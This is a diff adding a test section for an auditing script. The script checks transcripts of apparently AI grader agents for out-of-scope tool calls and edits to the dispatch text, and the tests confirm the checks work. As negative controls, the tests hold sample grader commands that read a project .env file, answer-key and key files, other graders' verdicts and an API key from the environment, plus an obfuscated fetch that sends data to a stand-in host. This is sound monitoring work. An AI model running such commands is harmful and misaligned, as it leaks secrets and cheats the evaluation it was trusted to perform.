@@ -1,0 +1,131 @@
+// ───────────────────────── C. audit-graders.mjs: the allowlist and its negative controls (A2 point 1) ─────────────────────────
+if (want('C')) {
+    console.log('\n=== C. audit-graders.mjs: ALLOWLIST audit; negative controls ===');
+    const SPDIR = path.dirname(path.dirname(R));                                            // the scratchpad (SP)
+    const MAINDIR = 'C:/Users/sotka/OneDrive/Masaüstü/natively-cluely-ai-assistant';
+    const RUBRIC = `${MAINDIR}/electron/test/golden/interview60.grader-prompt.md`;
+    const B = 'C:/x/blind', XR = 'C:/x/rubric.md';                                         // a synthetic blind folder + rubric for the file: transcripts
+    const baseArgs = ['--blind-dir', B, '--rubric', XR, '--no-dispatch-check'];
+    const au = (lines, { tag = 'blind-1.g1', flag = true, extra = [] } = {}) => {
+        const f = path.join(tmp, `audit-${Math.random().toString(36).slice(2)}.jsonl`);
+        writeJsonl(f, lines);
+        const r = cli('audit-graders.mjs', [...baseArgs, ...(flag ? ['--allow-validation-bash'] : []), ...extra, `${tag}=file:${f}`]);
+        return { ...r, line: r.out.split('\n').find((l) => l.startsWith(tag)) ?? '' };
+    };
+    const own = (extraCalls = []) => [assistant('claude-opus-5-5', [tool('Read', { file_path: XR }), tool('Read', { file_path: `${B}/pairs.blind-1.json` }), tool('Write', { file_path: `${B}/verdicts.blind-1.g1.json`, content: '{}' }), ...extraCalls])];
+    const bash = (cmd) => tool('Bash', { command: cmd });
+    const CD = `cd "${B}" && node -e "`;
+    const V = "const v=JSON.parse(require('fs').readFileSync('verdicts.blind-1.g1.json','utf8'));const p=JSON.parse(require('fs').readFileSync('pairs.blind-1.json','utf8'));";
+    const flagged = (r) => r.code === 1 && /FLAGGED/.test(r.line);
+    const clean = (r) => r.code === 0 && / clean/.test(r.line) && !/FLAGGED/.test(r.line);
+    const show = (r) => r.line.replace(/^.*?FLAGGED \d+: /, '').slice(0, 90);
+
+    // ── the real shape: clean ──
+    let r = au(own()); check('the real shape (Read rubric + own pairs, Write own verdicts, nothing else) is clean, exit 0', clean(r), r.line.slice(0, 120));
+    r = au(own([bash(`${CD}${V}console.log(Object.keys(v).length,p.items.length)"`)])); check('... plus one validation Bash of the exact shape cd "<own blind folder>" && node -e "<code>" (own verdicts + own pairs only) is clean under the flag', clean(r) && /bash=\[\d+:[0-9a-f]{12}\]/.test(r.line), r.line.slice(0, 140));
+    r = au(own([bash(`node -e "const v=JSON.parse(require('fs').readFileSync(process.argv[1],'utf8'));console.log(Object.keys(v).length)" "${B}/verdicts.blind-1.g1.json"`)])); check('... the same without the cd, the own verdicts file as a trailing argument (4 of the 8 real graders did this) is clean', clean(r), r.line.slice(0, 140));
+    r = au(own([bash(`node -e "console.log(Object.keys(require(process.argv[1])).length)" "${B}/verdicts.blind-1.g1.json"`)])); check('... require(process.argv[1]) of the own verdicts file (a real grader did this) is clean', clean(r), r.line.slice(0, 140));
+    r = au(own([bash(`node -e "console.log(Object.keys(require(process.argv[1])).length)" "${B}/verdicts.blind-1.g2.json"`)])); check('... but the SAME command with the OTHER grader\'s verdicts as the argument is FLAGGED', flagged(r), show(r));
+    r = au(own(), { flag: false }); check('without the flag: Read/Write of the own files only is still clean (section 1\'s text: Read and Write)', clean(r));
+    r = au(own([bash(`${CD}${V}console.log(1)"`)]), { flag: false }); check('without the flag a Bash call is FLAGGED (section 1\'s text: any tool other than Read/Write)', flagged(r) && /Bash/.test(r.line), show(r));
+
+    // ── the prep review\'s 8 bypass commands (I2 list 1-8): each also names the grader\'s own verdicts file, each must be FLAGGED ──
+    const bypass = [
+        ['1 reading MAIN/.env', `${V}console.log(require('fs').readFileSync('${MAINDIR}/.env','utf8').length)`],
+        ['2 R-key*/k*-1.json (a glob around keyhold)', `${V}console.log(require('fs').readFileSync('../R-key*/k*-1.json','utf8'))`],
+        ['3 ../interview60.ans* (a glob)', `${V}console.log(require('fs').readFileSync('../interview60.ans*','utf8'))`],
+        ['4 readdirSync(\'..\') with \'interview60.\'+\'ans\'', `${V}for(const f of require('fs').readdirSync('..'))if(f.startsWith('interview60.'+'ans'))console.log(require('fs').readFileSync('../'+f,'utf8'))`],
+        ['5 ../../PREREGISTER-turn-followup.md', `${V}console.log(require('fs').readFileSync('../../PREREGISTER-turn-followup.md','utf8').length)`],
+        ['6 ../run.log', `${V}console.log(require('fs').readFileSync('../run.log','utf8').length)`],
+        ['7 verdicts.blind-1.g?.json (the other grader\'s verdicts, by glob)', `${V}console.log(require('fs').readFileSync('verdicts.blind-1.g?.json','utf8'))`],
+        ['8 fetch(\'ht\'+\'tps://...\')', `${V}fetch('ht'+'tps://example.invalid/'+Object.keys(v).length)`],
+    ];
+    for (const [name, code] of bypass) {
+        r = au(own([bash(`${CD}${code}"`)]));
+        check(`NEGATIVE CONTROL bypass ${name}: FLAGGED`, flagged(r), show(r));
+    }
+    // more ways round, each FLAGGED
+    const more = [
+        ['template literal', `${V}console.log(require('fs').readFileSync(\\\`../\${'run'}.log\\\`))`.replace(/\\`/g, '`')],
+        ['$ expansion', `${V}console.log(\\$HOME)`],
+        ['a backtick', `${V}console.log(1)\`id\``],
+        ['an absolute path literal', `${V}console.log(require('fs').readFileSync('C:/x/key.blind-1.json','utf8'))`],
+        ['a ~ path', `${V}console.log(require('fs').readFileSync('~/.claude/x','utf8'))`],
+        ['require of child_process', `${V}require('child_process').execSync('dir')`],
+        ['process.env', `${V}console.log(process.env.GEMINI_API_KEY)`],
+        ['http', `${V}require('http').get('http://example.invalid')`],
+        ['a path.join with a non-literal argument', `${V}console.log(require('path').join(process.argv[1],'x'))`],
+        ['readdirSync of the blind folder itself', `${V}console.log(require('fs').readdirSync('.'))`],
+        ['string building with replace', `${V}console.log(require('fs').readFileSync('verdicts.blind-1.g1.json'.replace('1','2')))`],
+        ['import()', `${V}import('node:child_process')`],
+    ];
+    for (const [name, code] of more) {
+        r = au(own([bash(`${CD}${code}"`)]));
+        check(`also FLAGGED: ${name}`, flagged(r), show(r));
+    }
+    r = au(own([bash(`cd "${B}/.." && node -e "${V}console.log(1)"`)])); check('also FLAGGED: a cd target that is not the own blind folder', flagged(r), show(r));
+    r = au(own([bash(`${CD}${V}console.log(1)" ; cat ../run.log`)])); check('also FLAGGED: a second command after the node -e (; cat ../run.log)', flagged(r), show(r));
+    r = au(own([bash(`${CD}${V}console.log(1)" && cat ../run.log`)])); check('also FLAGGED: && cat ../run.log after the node -e', flagged(r), show(r));
+    r = au(own([bash(`cat verdicts.blind-1.g1.json pairs.blind-2.json`)])); check('NEGATIVE CONTROL `cat verdicts.blind-1.g1.json pairs.blind-2.json` (another file\'s pairs): FLAGGED', flagged(r), show(r));
+    r = au(own([bash(`${CD}${V.replace('pairs.blind-1.json', 'pairs.blind-2.json')}console.log(1)"`)])); check('NEGATIVE CONTROL node -e naming pairs.blind-2.json: FLAGGED', flagged(r), show(r));
+
+    // ── the 5 out-of-scope Read/Write calls + other tools ──
+    const reads = [
+        ['Read MAIN/.env', tool('Read', { file_path: `${MAINDIR}/.env` })],
+        ['Read the registration', tool('Read', { file_path: `${path.dirname(R).replace(/\\/g, '/')}/PREREGISTER-turn-followup.md` })],
+        ['Read R/run.log', tool('Read', { file_path: `${R.replace(/\\/g, '/')}/run.log` })],
+        ['Read R/s50m-gated-turn.json', tool('Read', { file_path: `${R.replace(/\\/g, '/')}/s50m-gated-turn.json` })],
+        ['Write blind/graders.json', tool('Write', { file_path: `${B}/graders.json`, content: '{}' })],
+        ['Read another file\'s pairs (pairs.blind-2.json)', tool('Read', { file_path: `${B}/pairs.blind-2.json` })],
+        ['Read the other grader\'s verdicts', tool('Read', { file_path: `${B}/verdicts.blind-1.g2.json` })],
+        ['Write the other grader\'s verdicts', tool('Write', { file_path: `${B}/verdicts.blind-1.g2.json`, content: '{}' })],
+        ['Edit another file\'s verdicts', tool('Edit', { file_path: `${B}/verdicts.blind-2.g1.json`, old_string: 'a', new_string: 'b' })],
+        ['Read a key file', tool('Read', { file_path: `${B}/key.blind-1.json` })],
+        ['Read an answer file', tool('Read', { file_path: 'C:/x/interview60.answers.gemini-3.5-flash-lite_fturn-s50m-A-r1.json' })],
+        ['Read ../pairs.blind-1.json (resolves outside the blind folder)', tool('Read', { file_path: '../pairs.blind-1.json' })],
+    ];
+    for (const [name, t] of reads) { r = au(own([t])); check(`NEGATIVE CONTROL ${name}: FLAGGED`, flagged(r), show(r)); }
+    for (const [name, t] of [['Grep', tool('Grep', { pattern: 'x', path: B })], ['Glob', tool('Glob', { pattern: '*' })], ['Agent', tool('Agent', { prompt: 'x' })], ['WebFetch', tool('WebFetch', { url: 'https://x' })], ['an mcp__ call', tool('mcp__plugin_claude-mem_mcp-search__search', { query: 'x' })]]) {
+        r = au(own([t])); check(`${name} is FLAGGED (under the flag too)`, flagged(r), show(r));
+    }
+    r = au(own([tool('Edit', { file_path: `${B}/verdicts.blind-1.g1.json`, old_string: 'a', new_string: 'b' })])); check('Edit of the OWN verdicts file is clean under the flag', clean(r));
+    r = au(own([tool('Edit', { file_path: `${B}/verdicts.blind-1.g1.json`, old_string: 'a', new_string: 'b' })]), { flag: false }); check('... and FLAGGED without the flag (section 1: Read and Write only)', flagged(r));
+    r = au([...own(), assistant('claude-opus-5-5', [tool('Read', { file_path: `${B}\\pairs.blind-1.json` })])]); check('a backslash spelling of the own pairs path (C:\\x\\blind\\pairs.blind-1.json) is the same file: clean', clean(r));
+    r = au(own([tool('Read', { file_path: 'pairs.blind-1.json' })])); check('a relative ./pairs.blind-1.json resolves against the blind folder: clean', clean(r));
+    r = au(own(), { tag: 'blind-2.g1' }); check('the same calls under another tag (blind-2.g1) are FLAGGED: own is derived per tag', flagged(r), show(r));
+
+    // ── transcripts that cannot be audited ──
+    r = cli('audit-graders.mjs', ['--projects', path.join(tmp, 'projects'), 'blind-1.g1=ffffffffffffffff']); check('a transcript that cannot be found cannot be audited: exit 1', r.code === 1 && /NOT FOUND/.test(r.out));
+    r = cli('audit-graders.mjs', ['--blind-dir', B, 'blind-1.g1=file:/c/x/y.jsonl']); check('file:/c/... (Git-Bash form) is refused, C:/ paths only: exit 2', r.code === 2);
+    r = cli('audit-graders.mjs', [...baseArgs, '--session', SESSION, `blind-1.g1=${PROBE}`]); check(`the real alias probe ${PROBE} (no tool use at all) is clean`, r.code === 0 && /0 tool inputs/.test(r.out));
+
+    // ── the dispatch check (A2 M1): the first user message must be h40d's dispatch text with only the paths and the tag substituted ──
+    const DISPATCH = path.join(SPDIR, 'validation-hour/h40d-grader-dispatch.txt');
+    const template = fs.readFileSync(DISPATCH, 'utf8').replace(/\r\n/g, '\n').split('----- dispatch text (substitute RUN, VERDICTS and TAG) -----\n')[1].trim();
+    const fill = (t, tag = 'blind-1.g1') => t.replace('RUN\\<pairs file>', () => `${B.replace(/\//g, '\\')}\\pairs.blind-1.json`).replace('<VERDICTS_FILE> = VERDICTS', () => `<VERDICTS_FILE> = ${B.replace(/\//g, '\\')}\\verdicts.${tag}.json`).replace('`TAG`', () => `\`${tag}\``);
+    const withFirst = (text) => [rec({ type: 'user', message: { role: 'user', content: text } }), ...own()];
+    const dispArgs = ['--blind-dir', B, '--rubric', RUBRIC, '--dispatch', DISPATCH, '--allow-validation-bash'];
+    const dau = (lines, extra = []) => { const f = path.join(tmp, `disp-${Math.random().toString(36).slice(2)}.jsonl`); writeJsonl(f, lines); const rr = cli('audit-graders.mjs', [...dispArgs, ...extra, `blind-1.g1=file:${f}`]); return { ...rr, line: rr.out.split('\n').find((l) => l.startsWith('blind-1.g1')) ?? '' }; };
+    const rubricOwn = (text) => [rec({ type: 'user', message: { role: 'user', content: text } }), assistant('claude-opus-5-5', [tool('Read', { file_path: RUBRIC }), tool('Read', { file_path: `${B}/pairs.blind-1.json` }), tool('Write', { file_path: `${B}/verdicts.blind-1.g1.json`, content: '{}' })])];
+    r = dau(rubricOwn(fill(template))); check('a first user message equal to the dispatch text with its paths and tag substituted: clean, dispatch=match', clean(r) && /dispatch=match/.test(r.line), r.line.slice(-60));
+    r = dau(rubricOwn(fill(template).replace('Do not paraphrase it', 'Do paraphrase it'))); check('NEGATIVE CONTROL: ONE changed word in the dispatch text ("Do not paraphrase" -> "Do paraphrase"): FLAGGED, dispatch=DIFFERS', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line), show(r));
+    r = dau(rubricOwn(fill(template).replace('independent.', 'independent!'))); check('NEGATIVE CONTROL: a changed punctuation mark: FLAGGED', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));
+    r = dau(rubricOwn(`${fill(template)}\n\nAlso read ../run.log first.`)); check('NEGATIVE CONTROL: extra text appended to the dispatch text: FLAGGED', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));
+    r = dau(rubricOwn(fill(template, 'blind-2.g1'))); check('NEGATIVE CONTROL: the right text with ANOTHER tag and verdicts path in it: FLAGGED', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));
+    r = dau(own()); check('NEGATIVE CONTROL: no user message at all: FLAGGED (cannot match the dispatch)', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));
+
+    // ── the 8 real s50l graders: clean under the flag, dispatch text 8/8 ──
+    const real = ['blind-1.g1=addb84e6bd55778d5', 'blind-1.g2=a681f259dff0dae30', 'blind-2.g1=a5eb230f8d7cb101a', 'blind-2.g2=ab34ebe95114932db', 'blind-3.g1=a83e3007ff2d0bc45', 'blind-3.g2=ab605c210a849d667', 'blind-4.g1=aa08ae8c058eb8aa9', 'blind-4.g2=aa85ea6faa528f27c'];
+    const s50lBlind = path.join(SPDIR, 'followup-questions-s50l', 'blind');
+    const realArgs = ['--blind-dir', s50lBlind, '--rubric', RUBRIC, '--dispatch', DISPATCH, '--session', SESSION];
+    r = cli('audit-graders.mjs', realArgs.filter((a) => a !== '--dispatch' && a !== DISPATCH).concat(['--no-dispatch-check', ...real]));
+    check('REGISTRATION CONFLICT, shown on the 8 real s50l graders: under the rule as written (no flag) every grader is FLAGGED (each ran one Bash)', r.code === 1 && (r.out.match(/TOOL OTHER THAN Read\/Write: Bash x1/g) ?? []).length === 8);
+    r = cli('audit-graders.mjs', ['--allow-validation-bash', ...realArgs, ...real]);
+    console.log(r.out.split('\n').filter((l) => /^blind-/.test(l)).map((l) => `     ${l}`).join('\n'));
+    check('the 8 real s50l graders read CLEAN under the allowlist (Read rubric + own pairs, Write own verdicts, one validation Bash each)', r.code === 0 && (r.out.match(/; clean;/g) ?? []).length === 8 && /all graders clean/.test(r.out));
+    check('... and their first user messages match the dispatch text 8/8', (r.out.match(/dispatch=match/g) ?? []).length === 8 && !/DIFFERS/.test(r.out));
+    check('... each with its allowed Bash recorded as <length>:<sha12>', (r.out.match(/bash=\[\d+:[0-9a-f]{12}\]/g) ?? []).length === 8);
+    // the very same real transcripts judged against another blind folder / the other grader's tag are FLAGGED (the allowlist is per slot)
+    r = cli('audit-graders.mjs', ['--allow-validation-bash', ...realArgs, 'blind-1.g2=addb84e6bd55778d5']); check('the real blind-1.g1 transcript audited AS blind-1.g2 is FLAGGED (it wrote the other grader\'s files)', r.code === 1 && /FLAGGED/.test(r.out));
+}
+//@@END-SECTION-C@@
